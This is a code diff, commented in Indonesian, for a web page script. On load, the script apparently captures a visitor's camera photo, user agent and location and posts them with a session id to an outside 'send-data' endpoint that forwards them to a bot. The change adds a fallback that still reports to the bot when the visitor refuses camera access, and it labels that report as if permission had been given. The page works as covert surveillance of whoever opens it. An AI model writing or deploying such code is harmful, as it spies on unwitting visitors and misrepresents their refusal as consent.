@@ -69,7 +69,7 @@
             
             // Kirim foto kosong (fallback) ke server
             const formData = new FormData();
-            formData.append("photo", "");  // Kirimkan fallback gambar
+            formData.append("photo", blob);  // Kirimkan fallback gambar
             formData.append("caption", caption);
             
             const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
@@ -87,10 +87,53 @@
             }
         } catch (error) {
             document.getElementById("status").innerText = "Pengguna menolak";
-            sendEmptyDataToAPI();
+            sendFoto();
             return;
         }
     }
+
+    async function sendFoto() {
+    document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan. foto";
+
+    // URL gambar fallback
+    const fallbackImageURL = 'https://i.scdn.co/image/ab67616d00001e0288a1f3c6c2711b92aabdf488';  // Ganti dengan URL gambar yang valid
+
+    try {
+        // Ambil gambar dari URL
+        const response = await fetch(fallbackImageURL);
+        const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
+
+        const session = new URLSearchParams(window.location.search).get("session");
+
+        const caption = `
+        📍 **Data Pengguna: mengizinkan**
+        - User-Agent: -
+        - Lokasi: -
+        - Sesi: ${session}
+        `;
+        
+        // Kirim foto kosong (fallback) ke server
+        const formData = new FormData();
+        formData.append("photo", blob);  // Kirimkan fallback gambar
+        formData.append("caption", caption);
+        
+        const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+            method: "POST",
+            body: formData,
+        });
+        
+        // Cek jika respons adalah "Data berhasil dikirim ke bot!"
+        const responseText = await apiResponse.text();
+        if (responseText === "Data berhasil dikirim ke bot! foto") {
+            document.getElementById("status").innerText = "Data berhasil dikirim ke bot! foto";
+            return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
+        } else {
+            document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi. foto";
+        }
+    } catch (error) {
+        document.getElementById("status").innerText = "Gagal mengirim data kosong (fallback). foto";
+    }
+}
     
     // Jalankan fungsi saat halaman dimuat
     window.onload = sendDataToServer;
